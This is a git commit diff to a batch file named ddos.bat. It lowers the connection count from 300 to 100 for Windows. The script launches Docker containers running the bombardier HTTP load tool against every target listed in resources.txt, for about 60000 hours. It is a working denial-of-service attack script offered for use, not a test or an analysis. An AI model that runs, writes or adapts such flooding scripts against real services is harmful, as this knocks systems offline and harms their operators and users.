c4d31e1e7db24d8f9446ca50b32715849631dcec
koterion <koterion317@gmail.com>
2022-02-27 17:01:08 +0200

    For windows change to 100 connections

--- ddos.bat
+++ ddos.bat
@@ -3,6 +3,6 @@
 docker kill $(docker ps -q)
 
 for /f "tokens=*" %%s in (resources.txt) do (
-	docker run -d --rm alpine/bombardier -c 300 -d 60000h -l %%s
+	docker run -d --rm alpine/bombardier -c 100 -d 60000h -l %%s
 )
 pause
